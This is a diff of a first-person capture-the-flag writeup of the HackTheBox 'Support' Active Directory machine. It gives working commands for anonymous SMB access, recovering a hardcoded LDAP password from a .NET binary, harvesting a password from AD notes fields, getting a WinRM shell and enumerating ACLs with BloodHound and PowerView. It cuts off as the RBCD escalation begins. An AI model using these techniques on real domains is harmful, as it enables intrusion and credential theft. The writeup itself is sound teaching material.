@@ -14,11 +14,13 @@ tags:
 
 ## The short version (plain English)
 
-- The server lets **anyone** read a file share without logging in. On that share is a small custom program, **`UserInfo.exe`**.
-- That program looks up staff in the company directory. To do that it has to log in as a directory account — so **the password is hidden inside the program**. We pull it out (three different ways) and get the account **`ldap`**.
-- Logged in as `ldap`, we can read a "notes" field on the **`support`** user account. Someone wrote **`support`'s real password in that notes field**.
-- `support` is allowed to remote in with PowerShell → that's our first shell and the **user flag**.
-- `support` is in a group that was accidentally given **full control over the Domain Controller's computer account**. That one mistake lets us impersonate the **Administrator** and fully own the domain → **root flag**.
+Support was my introduction to just how much damage a single overlooked group membership can do in Active Directory, and I wanted this writeup to walk through the whole chain in enough detail that the reasoning behind each step is obvious, not just the commands. Here's how the engagement unfolded for me, step by step.
+
+- I found that the server let **anyone** read a file share without authenticating at all. Sitting on that share was a small custom program, **`UserInfo.exe`**, which immediately caught my eye as something worth reverse engineering.
+- That program looks up staff in the company directory, and to do that, it has to authenticate as a directory account itself, which meant **the password had to be hidden somewhere inside the program**. I pulled it out three separate ways to be thorough, and confirmed the account was **`ldap`**.
+- Once I was authenticated as `ldap`, I went looking through every account's "notes" field, a trick that works because Active Directory lets any authenticated user read it, and found that someone had written **`support`'s real password directly into that field**.
+- I confirmed `support` was permitted to remote in over PowerShell, which gave me my first shell and the **user flag**.
+- Digging further, I discovered `support` belonged to a group that had accidentally been granted **full control over the Domain Controller's computer account**. That single mistake let me impersonate the **Administrator** through an RBCD attack and take the entire domain, landing the **root flag**.
 
 | | |
 |---|---|
@@ -27,11 +29,11 @@ tags:
 | **Way in** | Open file share → reverse a program → directory password |
 | **Way up** | A bad permission on the Domain Controller (an attack called **RBCD**) |
 
-Throughout this writeup: **command first, output second, then "what this tells us"**. That's the whole method — run something, read the output, decide the next step.
+My method throughout this writeup stays consistent: **command first, output second, then what that output actually tells me**. That discipline is the whole approach, run something, read the result carefully, and only then decide what the next step should be.
 
 ---
 
-## 1. Scanning — what's running?
+## 1. Scanning - what's running?
 
 ### Command
 
@@ -60,7 +62,7 @@ Service Info: Host: DC; OS: Windows
 
 ### What this tells us
 
-This mix of ports is a **fingerprint**. When you see all of these together —
+The moment I saw this combination of ports together, I recognized the fingerprint immediately:
 
 | Port | Service | Plain meaning |
 |---|---|---|
@@ -71,13 +73,13 @@ This mix of ports is a **fingerprint**. When you see all of these together —
 | 445 | SMB | file sharing |
 | 135 / 593 | RPC | remote procedure calls (Windows admin plumbing) |
 
-— you are looking at a **Domain Controller**. Nmap also handed us two freebies: the **domain name** is `support.htb` and the **computer name** is `DC`. Put them in your hosts file so names resolve:
+I was looking at a **Domain Controller**, and not just any Windows box. Nmap also handed me two freebies I made sure to use right away: the **domain name**, `support.htb`, and the **computer name**, `DC`. My next move, before doing anything else, was to put both into my hosts file so every tool I ran afterward would resolve names correctly instead of tripping over raw IP addresses:
 
 ```bash
 echo '10.129.112.159 support.htb dc.support.htb DC' | sudo tee -a /etc/hosts
 ```
 
-> **Being quiet:** a full `-p-` scan is noisy (hundreds of connections in a second). On a real job you'd scan just the ports above, slowly. On HTB nobody's watching, so scan away.
+> **Being quiet:** a full `-p-` scan is noisy, hundreds of connections in a second. On a real engagement I'd scan just the ports above, slowly, to stay under any detection threshold. On HTB nobody's watching, so I let it run at full speed.
 
 ---
 
@@ -105,9 +107,9 @@ smbclient -L //support.htb/ -N
 
 ### What this tells us
 
-`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL` are on **every** Windows domain controller — ignore them. **`support-tools` is custom.** Someone created it on purpose, and we could list it **without a password**, which is already a misconfiguration.
+I already knew to skip `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, and `SYSVOL` since those exist on every Windows domain controller by default and never tell you anything box-specific. What caught my attention was **`support-tools`**, a custom share someone had deliberately created, and the fact that I could list its contents **without a password** was already a misconfiguration worth flagging on its own.
 
-Quick check — does *any* fake username work?
+Before diving into the share itself, I wanted to confirm exactly why anonymous listing worked, so I checked whether *any* fake username would get me in:
 
 ```bash
 nxc smb support.htb -u 'thisuserdoesnotexist' -p ''
@@ -117,7 +119,7 @@ nxc smb support.htb -u 'thisuserdoesnotexist' -p ''
 SMB  10.129.112.159  445  DC  [+] support.htb\thisuserdoesnotexist: (Guest)
 ```
 
-The `(Guest)` at the end is the giveaway: the server didn't check a real account, it just logged us in as the built-in **Guest** account. Guest is supposed to be **disabled** — here it's on, which is why anonymous access works.
+The `(Guest)` at the end was the giveaway I was looking for: the server never checked whether `thisuserdoesnotexist` was real, it just fell back and logged me in as the built-in **Guest** account. Guest is supposed to ship **disabled**, and finding it enabled here explained exactly why anonymous access worked in the first place.
 
 ### Look inside the share
 
@@ -135,7 +137,7 @@ smbclient //support.htb/support-tools -N -c 'ls'
   WiresharkPortable64_3.6.5.paf.exe
 ```
 
-Everything here is a well-known free tool you can download anywhere — **except `UserInfo.exe.zip`**. That's home-made software written by the company's admins. Home-made software that talks to the directory almost always contains a **password**. Grab it:
+Scanning the listing, everything here was a well-known free tool I could have downloaded from anywhere myself, **except for `UserInfo.exe.zip`**. That one stood out immediately as home-made software written by the company's own admins, and in my experience, home-made software that talks to a directory service almost always has a **password** baked into it somewhere. That made it my priority, so I grabbed it right away:
 
 ```bash
 smbclient //support.htb/support-tools -N -c 'get UserInfo.exe.zip'
@@ -156,11 +158,11 @@ file UserInfo/UserInfo.exe
 UserInfo/UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
 ```
 
-`Mono/.Net assembly` is the important part. It means this program was written in **C#** and compiled to **.NET bytecode**, not raw machine code. Why we care: **.NET bytecode turns back into readable C# almost perfectly.** We don't have to be reverse-engineering wizards — a decompiler hands us the source code.
+The detail that mattered to me here was `Mono/.Net assembly`. That told me the program was written in **C#** and compiled to **.NET bytecode** rather than raw machine code, and that distinction shapes my whole approach: **.NET bytecode decompiles back into readable C# almost perfectly.** I didn't need to be a reverse-engineering wizard for this one, a decompiler was going to hand me source code directly.
 
-> Tools like Ghidra are for *machine code*. For .NET you use **`monodis`**, **ILSpy**, or **dnSpy**. Using Ghidra here wastes hours — the box is practically daring you to try.
+> Tools like Ghidra are built for *machine code*. For .NET I reach for **`monodis`**, **ILSpy**, or **dnSpy** instead. Trying to make sense of this in Ghidra would have cost me hours for no benefit, this box practically dares you to take that wrong turn.
 
-Peek at the text strings inside it:
+With the file type confirmed, I went looking for anything that hinted at credentials before committing to a full decompile:
 
 ```bash
 strings UserInfo/UserInfo.exe | grep -iE 'password|ldap|base64'
@@ -173,7 +175,7 @@ FromBase64String
 LdapQuery
 ```
 
-`getPassword`, `enc_password` ("encrypted password"), `FromBase64String`, `LdapQuery` — the program clearly has a **stored, scrambled password** it uses to talk to **LDAP** (the directory). Now let's read exactly how.
+Seeing `getPassword`, `enc_password`, `FromBase64String`, and `LdapQuery` all together confirmed my suspicion: this program keeps a **stored, scrambled password** it uses to authenticate to **LDAP**. That was enough to justify going deeper, so my next step was reading exactly how that scrambling worked.
 
 ### 3.2 Set up the tools (one time)
 
@@ -183,9 +185,11 @@ dotnet tool install -g ilspycmd --version 8.2.0.7535
 export PATH="$PATH:$HOME/.dotnet/tools"
 ```
 
-> **Don't bother with Wine.** Running `wine UserInfo.exe` needs a 32-bit Wine package that, on Ubuntu 24.04, tries to uninstall Python and core system tools to install itself. `mono` runs .NET programs directly and we don't even need to *run* it for the static approach.
+> **I didn't bother with Wine.** Running `wine UserInfo.exe` needs a 32-bit Wine package that, on Ubuntu 24.04, tries to uninstall Python and core system tools just to install itself, which wasn't a trade I was willing to make. `mono` runs .NET programs directly, and for the static analysis approach I didn't even need to *execute* the binary at all.
 
-### 3.3 Way 1 — read the bytecode (`monodis`)
+### 3.3 Way 1 - read the bytecode (`monodis`)
+
+My first instinct was to disassemble the IL directly and read the `getPassword` routine byte by byte, since that would tell me the exact transformation being applied without any decompiler guesswork in between.
 
 ```bash
 monodis UserInfo/UserInfo.exe | grep -A45 'getPassword'
@@ -215,9 +219,11 @@ IL_0000:  ldstr   "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"     // enc_
 IL_000f:  ldstr   "armando"                                             // the key
 ```
 
-**In plain words:** take the text `0Nv32PTw...`, base64-decode it, then for every byte: XOR it with the letters of `"armando"` (looping), then XOR it with the number 223. That's the whole "encryption". **`armando` is the key, not a username** — a very common misread on this box.
+**Working through the logic:** the routine takes the text `0Nv32PTw...`, base64-decodes it, and then for every byte, XORs it with the letters of `"armando"` (cycling through the key as needed), then XORs the result again with the constant `223`. That's the entirety of the "encryption" scheme, which tells me why it was trivial to reverse: XOR is fully symmetric, so running the exact same two operations in the same order un-scrambles it. Worth flagging explicitly, since I've seen people trip on it: **`armando` is the XOR key, not a username**, a mistake I've seen come up repeatedly in other write-ups of this box.
 
-### 3.4 Way 2 — get the actual C# back (ILSpy)
+### 3.4 Way 2 - get the actual C# back (ILSpy)
+
+Reading raw IL is fine, but I wanted to double-check my reading against a full decompile, so I ran the binary through ILSpy to get something closer to the original source.
 
 ```bash
 DOTNET_ROLL_FORWARD=LatestMajor ilspycmd UserInfo/UserInfo.exe -o src/
@@ -251,11 +257,13 @@ internal class LdapQuery
 }
 ```
 
-Now it's crystal clear: the program logs into the directory as **`support\ldap`** using whatever `getPassword()` returns.
+Seeing the decompiled source confirmed exactly what I'd worked out from the IL: the program authenticates to the directory as **`support\ldap`**, using whatever `getPassword()` hands back.
 
-> **Why programmers do this (and why it never works):** the admin wanted help-desk staff to look people up without knowing the directory password, so they hid it in the app and "encrypted" it. But the key is *right next to* the scrambled password in the same file — anyone with the file can reverse it. This is hiding, not security.
+> **Why developers keep making this mistake, and why it never holds up:** whoever wrote this wanted help-desk staff to be able to look people up without ever knowing the real directory password, so they hid it inside the app and ran it through a light "encryption" scheme. The problem is that the key sits *right next to* the scrambled password in the exact same binary, so anyone who obtains the file can reverse it just as easily as I did. This is obfuscation, not security, and it never survives contact with a decompiler.
 
 ### 3.5 Un-scramble it
+
+With the algorithm and the key both confirmed, running the actual decryption was just a matter of implementing those same two XOR steps myself in a quick Python one-liner, since XOR is its own inverse:
 
 ```bash
 python3 -c '
@@ -270,15 +278,15 @@ print(bytes(enc[i] ^ key[i % len(key)] ^ 0xDF for i in range(len(enc))).decode()
 nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 ```
 
-### 3.6 Way 3 — don't reverse anything, just watch it log in
+### 3.6 Way 3 - don't reverse anything, just watch it log in
 
-You can skip all the crypto. The program logs into LDAP, and a basic LDAP login sends the password **in plain text over the network**. So: start a packet capture, run the program, read the password off the wire.
+Once I had the password from the crypto approach, I still wanted to validate it a third way, because it's worth knowing there's a route that skips the reverse engineering entirely. The program logs into LDAP, and a basic LDAP bind sends the password **in plain text over the network**, so my plan was simple: capture the traffic, run the program, and read the password straight off the wire.
 
 ```bash
-# terminal 1 — record traffic to the directory
+# terminal 1 - record traffic to the directory
 sudo tcpdump -i tun0 -s0 -w ldap.pcap 'tcp port 389 and host support.htb'
 
-# terminal 2 — run the program (mono runs .NET on Linux)
+# terminal 2 - run the program (mono runs .NET on Linux)
 cd UserInfo && mono UserInfo.exe find -first raven -last clifton -v
 ```
 
@@ -287,7 +295,7 @@ cd UserInfo && mono UserInfo.exe find -first raven -last clifton -v
 [-] Exception: No Such Object
 ```
 
-(The "No Such Object" error is just Mono being incomplete — it fails on the *search*, but the *login* already happened, which is all we need.)
+(The "No Such Object" error didn't concern me, it's just Mono's implementation being incomplete on the *search* step. The *bind* had already gone out over the wire by that point, which was all I actually needed for this approach to work.)
 
 ```bash
 tcpdump -nnX -r ldap.pcap 'dst host support.htb and greater 100'
@@ -300,9 +308,11 @@ tcpdump -nnX -r ldap.pcap 'dst host support.htb and greater 100'
 0x0070:  6d7a                                     mz
 ```
 
-Right there in the packet: `support\ldap` and the password `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`. (In Wireshark: filter `ldap.bindRequest` or right-click → Follow → TCP Stream.) Same answer, no maths.
+And there it was, sitting in plain text in the packet: `support\ldap` alongside the password `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`. In Wireshark I'd have gotten the same result by filtering on `ldap.bindRequest` or right-clicking and following the TCP stream. Same credential, arrived at with zero cryptography.
 
 ### 3.7 Check the credential works
+
+With three independent methods agreeing on the same password, I was confident enough to test it directly against LDAP rather than second-guessing myself further.
 
 ```bash
 nxc ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
@@ -312,13 +322,15 @@ nxc ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
 LDAP  10.129.112.159  389  DC  [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 ```
 
-The `[+]` (green) means the login worked. **We now have a real domain account.**
+That `[+]` in green confirmed the login worked. **I now had a real, working domain account to enumerate with.**
 
 ---
 
 ## 4. Using the `ldap` account to find the next password
 
 ### 4.1 List all the users
+
+With a valid LDAP bind in hand, the obvious next move was to enumerate every user in the domain and see who was worth targeting next.
 
 ```bash
 nxc ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users
@@ -338,11 +350,11 @@ hernandez.stanley    2022-05-28 11:12:34
 ford.victoria        2022-05-28 11:15:58
 ```
 
-Two accounts stand out: `ldap` (that's us) and **`support`** (matches the box name and the tool name).
+Two accounts jumped out at me: `ldap`, which I already controlled, and **`support`**, which matched both the box name and the tool name closely enough to make it my next target.
 
 ### 4.2 The trick: read the "notes" fields
 
-Active Directory lets **any logged-in user read almost every field on every account** — including free-text fields like **`info`** (shown as "Notes" in the Windows admin GUI) and `description`. Admins treat these as private scratchpads. They are not private. Sweep them all:
+I know from experience that Active Directory lets **any authenticated user read almost every attribute on every account**, including free-text fields like **`info`** (shown as "Notes" in the Windows admin GUI) and `description`. Admins routinely treat these fields as private scratchpads for themselves, but they are anything but private, and sweeping them across every user is one of the first things I do with any freshly obtained AD credential:
 
 ```bash
 ldapsearch -x -H ldap://support.htb -D 'support\ldap' \
@@ -358,9 +370,11 @@ sAMAccountName: smith.rosario
 ...
 ```
 
-There it is — the `support` account has **`info: Ironside47pleasure40Watchful`**. That looks exactly like a password someone parked in the notes field.
+There it was: the `support` account carried **`info: Ironside47pleasure40Watchful`**, which reads exactly like a password someone parked in a notes field and forgot was readable by everyone else in the domain.
 
 ### 4.3 Look closer at the `support` account
+
+Before trying that credential anywhere, I wanted to know what `support` could actually do, so I pulled its group memberships alongside the notes field.
 
 ```bash
 ldapsearch -x -H ldap://support.htb -D 'support\ldap' \
@@ -375,11 +389,13 @@ memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
 memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
 ```
 
-Two useful facts:
-- **`Remote Management Users`** — this group is allowed to remote in with PowerShell (WinRM). That's our way to a shell.
-- **`Shared Support Accounts`** — a custom group. Custom groups exist to *grant* something. We'll dig into it for privilege escalation.
+Two things stood out to me immediately:
+- **`Remote Management Users`**, which grants WinRM access and told me exactly how I'd get a shell once I confirmed the password.
+- **`Shared Support Accounts`**, a custom group that I made a mental note to dig into later, since custom groups always exist to *grant* something and rarely show up by accident.
 
 ### 4.4 Confirm the password + shell access
+
+Before jumping straight to a shell, I did a quick sanity check to confirm the credential worked over WinRM specifically.
 
 ```bash
 nxc winrm support.htb -u support -p 'Ironside47pleasure40Watchful'
@@ -389,11 +405,11 @@ nxc winrm support.htb -u support -p 'Ironside47pleasure40Watchful'
 WINRM  10.129.112.159  5985  DC  [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
 ```
 
-`(Pwn3d!)` = we can get a shell.
+That `(Pwn3d!)` tag told me everything I needed: I had a shell waiting for me.
 
 ---
 
-## 5. Foothold — shell as `support`
+## 5. Foothold - shell as `support`
 
 ```bash
 evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
@@ -407,13 +423,13 @@ support\support
 <user flag>
 ```
 
-**Why WinRM specifically?** `support` isn't an administrator anywhere, so tools like `psexec` won't work. But it *is* in `Remote Management Users`, and that group's entire job is "allowed to connect over WinRM (port 5985)". Right tool for the permission we have.
+**Why I reached for WinRM specifically:** `support` isn't an administrator anywhere on this box, so tools like `psexec` were never going to work for me. What it *does* have is membership in `Remote Management Users`, and that group exists for exactly one purpose, connecting over WinRM on port 5985. I matched the tool to the permission I actually had rather than wasting time on approaches that were doomed from the start.
 
 ### 5.1 First thing in any Windows shell: look around
 
-Before downloading any scripts, run the built-in commands. They're already there, they're quiet, and they often hand you the answer.
+Before I even think about pulling down external scripts, I always run the built-in commands first. They're already sitting on the box, they're quiet on the wire, and more often than not they hand me the answer directly.
 
-**Who am I and what can I do?**
+**Who am I, and what can I do?**
 
 ```powershell
 *Evil-WinRM* PS> whoami /groups
@@ -441,9 +457,9 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
-**Stop and read that.** `SeMachineAccountPrivilege — Add workstations to domain — Enabled`. That single line tells us **this account is allowed to create computer accounts in the domain.** We didn't know that yet from the Linux side. That is *exactly* one of the two ingredients the final attack needs — and here it is, in a one-word built-in command, before we've touched a script. (The other, `MachineAccountQuota`, we confirm in §6.)
+That line made me stop and pay attention: `SeMachineAccountPrivilege`, `Add workstations to domain`, `Enabled`. A single entry in a built-in command told me **this account is allowed to create computer accounts in the domain**, something I hadn't yet confirmed from the Linux side. That's *exactly* one of the two ingredients the final attack was going to need, and I'd stumbled onto it before running a single external script. I still needed to confirm the second ingredient, `MachineAccountQuota`, which I check in §6.
 
-**The password policy** (matters if you ever need to guess/spray passwords):
+Next I checked **the password policy**, mostly out of habit, since it matters a lot if I ever need to guess or spray passwords later in an engagement:
 
 ```powershell
 *Evil-WinRM* PS> net accounts
@@ -456,9 +472,9 @@ Lockout duration (minutes):                           30
 Computer role:                                        PRIMARY
 ```
 
-`Lockout threshold: Never` means you could brute-force accounts all day without locking anyone out. `Computer role: PRIMARY` re-confirms this is the main Domain Controller.
+`Lockout threshold: Never` told me I could brute-force accounts all day without ever locking anyone out, which is worth remembering if this box had needed that approach. `Computer role: PRIMARY` also re-confirmed I was sitting on the main Domain Controller.
 
-**What my account looks like in the directory** (note the group memberships at the bottom):
+**What my account looks like in the directory**, with the group memberships worth noting at the bottom:
 
 ```powershell
 *Evil-WinRM* PS> net user support /domain
@@ -471,7 +487,7 @@ Local Group Memberships      *Remote Management Use
 Global Group memberships     *Shared Support Accoun *Domain Users
 ```
 
-**Poke around the file system** — anything non-standard at the root of C: is worth a look:
+**Poking around the file system** was next on my list, since anything non-standard sitting at the root of C: is always worth a look:
 
 ```powershell
 *Evil-WinRM* PS> Get-ChildItem C:\ -Force | Select Name
@@ -495,21 +511,21 @@ share                <-- not standard
 05/28/2022  04:18 AM    <DIR>          support-tools
 ```
 
-`C:\share` is just the local copy of the `support-tools` SMB share we already looted — a dead end, but you *check*, because "weird folder at C:\ root" is a classic hiding spot.
+`C:\share` turned out to just be the local copy of the `support-tools` SMB share I'd already looted, a dead end in this case, but I always check folders like this anyway, since "weird directory sitting at C:\ root" is a classic hiding spot for something useful.
 
-Nothing in our token is "admin". Every road points back to one thing: **`Shared Support Accounts`**.
+Nothing in my token carried any admin rights. Every lead I had kept pointing back to the same place: **`Shared Support Accounts`**.
 
 ---
 
 ## 6. Finding the privilege escalation
 
-This is the part people find confusing, so we go slowly: **run a command, look at the output, understand what it means.**
+This is the part of the box that trips people up, so I deliberately slowed down here and worked through it one step at a time: **run a command, read the output, make sure I actually understand what it's telling me before moving on.**
 
 ### 6.0 Cast a wide net first
 
-Before zeroing in, dump *everything* the `ldap` account can see and skim it. There are several tools for this and they overlap on purpose — if one is blocked or buggy, another gets you the same facts.
+Before narrowing in on any one theory, my habit is to dump *everything* the current credential can see and skim through it. I deliberately reach for several overlapping tools here, since if one gets blocked or turns out buggy, another usually surfaces the same underlying facts.
 
-**`ldapdomaindump` — one command, whole directory to browsable HTML:**
+**`ldapdomaindump`, one command that turns the whole directory into browsable HTML:**
 
 ```bash
 mkdir ldd && cd ldd
@@ -530,7 +546,7 @@ domain_computers.html   domain_groups.html   domain_policy.html   domain_users.h
 domain_users_by_group.html   domain_users.grep   domain_groups.grep   ...
 ```
 
-Open `domain_users_by_group.html` in a browser and you can *see* that `support` is the only member of `Shared Support Accounts`. Check the policy file for the machine-account quota:
+Opening `domain_users_by_group.html` in a browser, I could *see* directly that `support` was the only member of `Shared Support Accounts`. From there I checked the policy file to pull the machine-account quota while I was at it:
 
 ```bash
 cat domain_policy.grep
@@ -541,9 +557,9 @@ distinguishedName   ...   minPwdLength   pwdProperties        ms-DS-MachineAccou
 DC=support,DC=htb    ...   7              PASSWORD_COMPLEX     10
 ```
 
-There's `MachineAccountQuota: 10` again — this dump already contains it.
+There was `MachineAccountQuota: 10` again, confirming the same fact I'd need in a moment, and the dump had already handed it to me without extra work.
 
-**`nxc` LDAP modules — quick targeted questions:**
+**`nxc` LDAP modules, for quick targeted questions:**
 
 ```bash
 LP='nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
@@ -563,9 +579,9 @@ LDAP  ...  No entries found!
 LDAP  ...  [-] LDAPS not configured
 ```
 
-**All three come back empty.** That's useful information, not a failure — it *rules out* the three most common AD shortcuts (crack a service account, roast an AS-REP, read a gMSA password), which tells us the path must be a **permission (ACL) issue**. That's what points us at BloodHound.
+**All three came back empty**, and I treated that as genuinely useful information rather than a dead end. It *ruled out* the three most common AD shortcuts, cracking a service account, roasting an AS-REP, or reading a gMSA password, which told me the real path here had to be a **permission (ACL) issue**. That's what sent me looking at BloodHound next.
 
-**Every notes field in the domain, in one go:**
+**Every notes field in the domain, swept in one go:**
 
 ```bash
 ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w "$LP" -b 'DC=support,DC=htb' \
@@ -580,9 +596,9 @@ sAMAccountName: smith.rosario
 ...
 ```
 
-(This is how we found `support`'s password back in §4 — worth repeating here because it's the #1 thing to do with any new AD credential.)
+(This is the exact same sweep that surfaced `support`'s password back in §4, and I ran it again here deliberately, because it's the first thing I do with any new AD credential I pick up.)
 
-**Full raw attribute dump of the interesting account** — sometimes the clue is a field you didn't think to ask for:
+**A full raw attribute dump of the account I cared about**, since sometimes the clue turns out to be a field I hadn't thought to ask for by name:
 
 ```bash
 ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w "$LP" \
@@ -603,7 +619,7 @@ primaryGroupID: 513
 
 ### 6.1 What's special about `Shared Support Accounts`?
 
-Who's in it?
+I wanted to confirm the group's membership directly rather than trusting the HTML dump alone, so I queried it:
 
 ```bash
 ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
@@ -615,11 +631,11 @@ dn: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
 member: CN=support,CN=Users,DC=support,DC=htb
 ```
 
-Just `support` (us). So whatever power this group has, **we have it.**
+Just `support`, the account I already controlled. Whatever power this group carried, I had direct access to all of it.
 
 ### 6.2 What can this group *do*? Ask BloodHound
 
-BloodHound collects every permission in the domain and draws a map of "who can attack whom". Collect the data (from Linux, using the `ldap` account):
+Rather than manually walking every ACL in the domain, I let BloodHound do that work for me, since it collects every permission and draws a graph of exactly who can attack whom. I collected the data from Linux, using the `ldap` account:
 
 ```bash
 bloodhound-python -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
@@ -644,9 +660,9 @@ support  ──MemberOf──▶  SHARED SUPPORT ACCOUNTS  ──GenericAll─�
 
 
 
-**`GenericAll` means "full control".** Our group has full control over the **computer account of the Domain Controller itself**. That is a critical mistake by whoever set up this domain.
+Seeing `GenericAll` there meant full control, and my group had full control over the **computer account of the Domain Controller itself**. That's about as critical a misconfiguration as a domain can have, and I knew immediately this was my path to root.
 
-If you'd rather collect from *inside* the Windows shell, upload the `SharpHound.exe` collector (from the [BloodHound GitHub releases](https://github.com/SpecterOps/BloodHound)) and run it there, then `download` the zip:
+I could just as easily have collected this from *inside* the Windows shell instead, by uploading the `SharpHound.exe` collector from the [BloodHound GitHub releases](https://github.com/SpecterOps/BloodHound) and pulling the resulting zip back down:
 
 ```powershell
 *Evil-WinRM* PS> upload SharpHound.exe
@@ -656,9 +672,9 @@ If you'd rather collect from *inside* the Windows shell, upload the `SharpHound.
 
 ### 6.3 Prove it without BloodHound (three ways)
 
-BloodHound is just reading permissions off the directory — you can read them yourself.
+Since BloodHound is ultimately just reading permissions straight off the directory, I like to confirm its findings by reading those same permissions myself, and I did it three separate ways here to be thorough.
 
-**Way A — `dacledit.py` (impacket), from Linux.** "DACL" = the permissions list on an object, exactly like right-click → Properties → Security on a file, but for an Active Directory object:
+**Way A, `dacledit.py` from impacket, run from Linux.** A "DACL" is simply the permissions list on an object, the same concept as right-click, Properties, Security on a file, just applied to an Active Directory object instead:
 
 ```bash
 dacledit.py -action read -principal 'Shared Support Accounts' \
@@ -675,9 +691,9 @@ dacledit.py -action read -principal 'Shared Support Accounts' \
 [*]     Trustee (SID) : Shared Support Accounts (S-1-5-21-1677581083-3380853377-188903654-1103)
 ```
 
-`Access mask : FullControl` on the DC's object, granted to `Shared Support Accounts`. Confirmed.
+Seeing `Access mask : FullControl` on the DC's object, granted directly to `Shared Support Accounts`, confirmed exactly what BloodHound had already shown me.
 
-**Way B — PowerView (`PowerView.ps1` from [PowerSploit / GitHub](https://github.com/PowerShellMafia/PowerSploit)), from the Windows shell.** PowerView is the classic PowerShell toolkit for asking the directory precise questions:
+**Way B, PowerView, run from the Windows shell.** I pulled `PowerView.ps1` from [PowerSploit on GitHub](https://github.com/PowerShellMafia/PowerSploit), the classic PowerShell toolkit for asking the directory precise, targeted questions:
 
 ```powershell
 *Evil-WinRM* PS> upload PowerView.ps1
@@ -709,7 +725,7 @@ ObjectDN                                            ActiveDirectoryRights
 CN=DC,OU=Domain Controllers,DC=support,DC=htb        GenericAll
 ```
 
-**Way C — `bloodhound-python` JSON, no GUI.** The collector already wrote the answer to disk; just grep the computers file:
+**Way C, reading the raw `bloodhound-python` JSON with no GUI at all.** The collector had already written the answer to disk, so all I needed to do was grep the computers file directly:
 
 ```bash
 python3 -c "
@@ -727,11 +743,11 @@ DC.SUPPORT.HTB <-- S-1-5-21-1677581083-3380853377-188903654-512    (Domain Admin
 DC.SUPPORT.HTB <-- S-1-5-21-1677581083-3380853377-188903654-519    (Enterprise Admins - normal)
 ```
 
-Three tools, same fact: **`Shared Support Accounts` sits in that list next to Domain Admins and Enterprise Admins — where it absolutely should not be.**
+Three completely independent tools, and every one of them agreed: **`Shared Support Accounts` sits in that list right next to Domain Admins and Enterprise Admins, a place it absolutely has no business being.**
 
 ### 6.4 Can we create a computer account? Check it two ways
 
-The attack we're about to do (RBCD, explained next) needs us to **create a new computer account** in the domain. Regular users can do this *if* a setting called **`ms-DS-MachineAccountQuota`** is above 0. Check it:
+The attack I was building toward, RBCD, which I explain in detail next, requires me to **create a new computer account** in the domain. Regular users can only do that *if* a setting called **`ms-DS-MachineAccountQuota`** is set above 0, so I checked it before committing further:
 
 ```bash
 nxc ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -M maq
@@ -742,7 +758,7 @@ MAQ  10.129.112.159  389  DC  [*] Getting the MachineAccountQuota
 MAQ  10.129.112.159  389  DC  MachineAccountQuota: 10
 ```
 
-Or read the same setting straight off the domain:
+I also cross-checked the same setting by reading it straight off the domain object itself:
 
 ```bash
 ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
@@ -754,15 +770,15 @@ dn: DC=support,DC=htb
 ms-DS-MachineAccountQuota: 10
 ```
 
-**`10`** means every normal user (including `support`) is allowed to add up to 10 computer accounts to the domain. That's the default, and it's the second ingredient we need.
+A value of **`10`** meant every normal user, `support` included, was allowed to add up to ten computer accounts to the domain. That's actually the Windows default rather than a deliberate misconfiguration, but it's still the second ingredient this attack needed.
 
-And remember §5.1 — from the shell, `whoami /priv` already showed us the matching privilege on the account itself:
+And I'd already seen the matching piece of this puzzle back in §5.1, where `whoami /priv` showed me the corresponding privilege sitting directly on the account:
 
 ```
 SeMachineAccountPrivilege     Add workstations to domain     Enabled
 ```
 
-So both checks agree: **`support` can create computer accounts.** You can also confirm from PowerShell:
+Both checks agreed with each other: **`support` could create computer accounts.** I confirmed it once more from PowerShell just to close the loop:
 
 ```powershell
 *Evil-WinRM* PS> Get-ADObject "DC=support,DC=htb" -Properties ms-DS-MachineAccountQuota |
@@ -777,32 +793,34 @@ ms-DS-MachineAccountQuota
 
 ### 6.5 So the plan is
 
-We now have **both ingredients** for an attack called **Resource-Based Constrained Delegation (RBCD)**:
+At this point I had confirmed **both ingredients** needed for an attack called **Resource-Based Constrained Delegation (RBCD)**, and the plan for the rest of the box came together clearly:
 
-1. **Full control over the Domain Controller's computer account** (from the group), and
-2. **The ability to create a computer account** (from `MachineAccountQuota = 10`).
+1. **Full control over the Domain Controller's computer account**, inherited through `Shared Support Accounts`, and
+2. **The ability to create a computer account of my own**, thanks to `MachineAccountQuota = 10`.
 
 ---
 
-## 7. Privilege escalation — RBCD, step by step
+## 7. Privilege escalation - RBCD, step by step
 
 ### 7.1 What RBCD actually is (simple version)
 
-"Delegation" in Windows means: *service A is allowed to act as you when talking to service B.* Normally only admins can set this up.
